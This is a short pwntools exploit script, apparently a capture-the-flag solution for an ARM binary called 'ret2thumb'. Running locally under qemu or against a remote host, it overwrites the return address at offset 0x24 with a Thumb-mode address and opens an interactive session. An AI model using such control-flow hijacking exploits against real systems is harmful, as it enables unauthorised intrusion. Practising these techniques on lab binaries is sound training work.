#!/usr/bin/env python3
from pwn import *
import tempfile

elf = ELF("./ret2thumb")

context.binary = elf
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]

def conn():
    if args.REMOTE:
        io = remote(args.HOST, args.PORT)
        # io = remote("addr", 1337)
    else:
        proc_args = ["qemu-arm", "-L", "/usr/arm-linux-gnueabihf"]
        if args.GDB:
            # context.log_level = "debug"
            proc_args += ["-g", "1234"]

        proc_args.append(elf.path)
        io = process(proc_args)

    return io

io = conn()

if args.GDB:
    temp = tempfile.NamedTemporaryFile(prefix="pwn", suffix=".gdb", delete=False, mode="w+")
    gdbscript = """
            target remote localhost:1234
    """
    temp.write(gdbscript)
    temp.close()
    run_in_new_terminal(f'gdb-multiarch -x="{temp.name}"')

payload = fit({
    0x24: 0x10561
})

io.sendline(payload)

io.interactive()
